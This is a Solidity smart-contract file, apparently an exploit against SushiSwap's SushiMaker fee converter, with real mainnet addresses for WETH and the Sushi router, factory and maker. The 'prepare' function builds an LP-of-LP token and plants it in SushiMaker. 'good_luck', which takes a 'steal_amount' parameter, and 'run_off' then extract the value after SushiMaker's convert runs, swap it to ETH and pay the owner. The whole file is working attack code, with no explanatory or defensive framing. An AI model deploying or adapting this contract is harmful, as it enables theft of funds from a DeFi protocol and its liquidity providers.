pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface ISushiFactory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface ISushiRouter {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface ISushiPair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function getReserves()
        external
        view
        returns (
            uint112 _reserve0,
            uint112 _reserve1,
            uint32 _blockTimestampLast
        );

    function token0() external returns (address);

    function token1() external returns (address);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function totalSupply() external returns (uint256);
}

interface IWETH {
    function balanceOf(address owner) external returns (uint256);

    function transfer(address dst, uint256 wad) external returns (bool);

    function withdraw(uint256 wad) external;
}

contract Luck {
    uint256 counter;
    address private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private sushi_router = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private sushi_maker = 0x6684977bBED67e101BB80Fc07fCcfba655c0a64F;
    address private sushi_factory = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    bool has_eth = false;
    bool slp_pair_exist = true;
    address private owner;

    constructor() payable {
        owner = msg.sender;
    }

    function prepare(address token0, address token1) public {
        has_eth = false;
        ISushiRouter router = ISushiRouter(sushi_router);
        // Step one: obtain initial token (sorted)
        address pair = ISushiFactory(sushi_factory).getPair(token0, token1);
        (uint256 reserve0, uint256 reserve1, ) = ISushiPair(pair).getReserves();
        uint256 amount0 = (1_000_000_000_100 * reserve0) /
            ISushiPair(pair).totalSupply();
        uint256 amount1 = (1_000_000_000_100 * reserve1) /
            ISushiPair(pair).totalSupply();
        amount0 = amount0 > 0 ? amount0 : 1;
        amount1 = amount1 > 0 ? amount1 : 1;
        has_eth = token0 == weth || token1 == weth;
        if (token0 != weth) {
            address[] memory path = new address[](2);
            path[0] = weth;
            path[1] = token0;
            router.swapETHForExactTokens{value: address(this).balance}(
                amount0,
                path,
                address(this),
                block.timestamp + 120
            );
            if (IERC20(token0).allowance(address(this), sushi_router) == 0) {
                SafeERC20.safeApprove(
                    IERC20(token0),
                    sushi_router,
                    type(uint256).max
                );
            }
        }
        if (token1 != weth) {
            address[] memory path = new address[](2);
            path[0] = weth;
            path[1] = token1;
            router.swapETHForExactTokens{value: address(this).balance}(
                amount1,
                path,
                address(this),
                block.timestamp + 120
            );
            if (IERC20(token1).allowance(address(this), sushi_router) == 0) {
                SafeERC20.safeApprove(
                    IERC20(token1),
                    sushi_router,
                    type(uint256).max
                );
            }
        }

        // Step two: add liquidity to obtain SLP
        if (IERC20(pair).allowance(address(this), sushi_router) == 0) {
            IERC20(pair).approve(sushi_router, type(uint256).max);
        }
        if (has_eth) {
            address erc_token = token1 == weth ? token0 : token1;

            ISushiRouter(sushi_router).addLiquidityETH{
                value: address(this).balance
            }(
                erc_token,
                IERC20(erc_token).balanceOf(address(this)),
                0,
                0,
                address(this),
                block.timestamp + 120
            );
        } else {
            ISushiRouter(sushi_router).addLiquidity(
                token0,
                token1,
                amount0,
                amount1,
                (99 * amount0) / 100,
                (99 * amount1) / 100,
                address(this),
                block.timestamp + 120
            );
        }

        // Step three: add liquidity(SLP+WETH) to obtain SLP'
        ISushiRouter(sushi_router).addLiquidityETH{value: 1000}(
            pair,
            IERC20(pair).balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 120
        );
        address slp_pair = ISushiFactory(sushi_factory).getPair(pair, weth);
        IERC20(slp_pair).transfer(sushi_maker, 100000);
        slp_pair_exist = false;
    }

    // After triger SushiMaker's convert function
    function good_luck(
        address token0,
        address token1,
        uint256 steal_amount
    ) external {
        // earn profit
        address pair = ISushiFactory(sushi_factory).getPair(token0, token1);
        has_eth = token0 == weth || token1 == weth;
        if (!slp_pair_exist) {
            address[] memory path = new address[](2);
            path[0] = weth;
            path[1] = pair;
            // address slp_pair = ISushiFactory(sushi_factory).getPair(pair, weth);
            // ISushiRouter(sushi_router).removeLiquidity(
            //     token0,
            //     token1,
            //     IERC20(slp_pair).balanceOf(address(this)) / 4,
            //     0,
            //     0,
            //     address(this),
            //     block.timestamp + 120
            // );
            ISushiRouter(sushi_router).swapExactETHForTokens{
                value: 1000000000000
            }(0, path, address(this), block.timestamp + 120);
        } else {
            if (IERC20(token0).allowance(address(this), sushi_router) == 0) {
                SafeERC20.safeApprove(
                    IERC20(token0),
                    sushi_router,
                    type(uint256).max
                );
            }
            if (IERC20(token1).allowance(address(this), sushi_router) == 0) {
                SafeERC20.safeApprove(
                    IERC20(token1),
                    sushi_router,
                    type(uint256).max
                );
            }
            if (IERC20(pair).allowance(address(this), sushi_router) == 0) {
                IERC20(pair).approve(sushi_router, type(uint256).max);
            }
            address[] memory path = new address[](2);
            path[0] = weth;
            path[1] = pair;
            uint256[] memory amount = ISushiRouter(sushi_router).getAmountsIn(
                steal_amount,
                path
            );
            ISushiRouter(sushi_router).swapETHForExactTokens{value: amount[0]}(
                steal_amount,
                path,
                address(this),
                block.timestamp + 120
            );
        }
        run_off(token0, token1);
    }

    function run_off(address token0, address token1) internal {
        // Step one: removeLiquidity SLP -> token0 + token1
        address pair = ISushiFactory(sushi_factory).getPair(token0, token1);
        if (has_eth) {
            address erc_token = token1 == weth ? token0 : token1;
            ISushiRouter(sushi_router).removeLiquidityETH(
                erc_token,
                IERC20(pair).balanceOf(address(this)),
                0,
                0,
                address(this),
                block.timestamp + 120
            );
        } else {
            ISushiRouter(sushi_router).removeLiquidity(
                token0,
                token1,
                IERC20(pair).balanceOf(address(this)),
                0,
                0,
                address(this),
                block.timestamp + 120
            );
            // Step two: swap erc20 token to ETH
            address[] memory path = new address[](2);
            path[0] = token0;
            path[1] = weth;
            ISushiRouter(sushi_router).swapExactTokensForETH(
                IERC20(token0).balanceOf(address(this)),
                0,
                path,
                address(this),
                block.timestamp + 120
            );
            path[0] = token1;
            ISushiRouter(sushi_router).swapExactTokensForETH(
                IERC20(token1).balanceOf(address(this)),
                0,
                path,
                address(this),
                block.timestamp + 120
            );
        }
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function over() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
